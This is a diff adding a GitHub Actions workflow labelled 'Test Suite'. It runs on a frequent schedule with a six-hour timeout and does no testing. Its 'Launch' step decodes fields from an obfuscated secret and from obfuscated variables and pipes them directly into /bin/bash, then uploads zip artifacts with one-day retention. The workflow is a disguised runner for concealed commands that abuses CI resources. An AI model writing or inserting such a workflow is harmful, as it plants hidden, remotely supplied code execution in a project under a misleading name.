@@ -1,0 +1,40 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          aq74717: ${{ secrets.aq74717 }}
+        run: |
+          printf '%s' "$aq74717" | jq -r .fw8810 | /bin/bash
+          printf '%s' "$gage8" | jq -r .mv80688 | /bin/bash
+          echo $wo3069 | jq -r .zcgio483 | /bin/bash
+          echo $jp3 | jq -r .cato8 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: CEBWNZcF
+          path: "*.zip"
+          retention-days: 1
